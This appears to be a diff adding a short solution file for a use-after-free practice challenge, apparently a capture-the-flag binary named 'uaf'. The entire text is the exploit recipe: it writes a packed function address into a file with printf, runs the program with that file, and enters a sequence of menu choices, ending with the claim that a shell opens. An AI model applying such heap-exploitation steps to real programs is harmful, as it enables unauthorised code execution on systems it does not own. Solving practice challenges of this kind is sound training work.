@@ -1,0 +1,13 @@
+Step 1: printf '\x68\x15\x40\x00' > <some_file>
+
+Step 2: ./uaf 4 <some_file>
+
+Step 3: 3
+
+Step 4: 2
+
+Step 5: 2
+
+Step 6: 1
+
+At this point a shell will be opened.
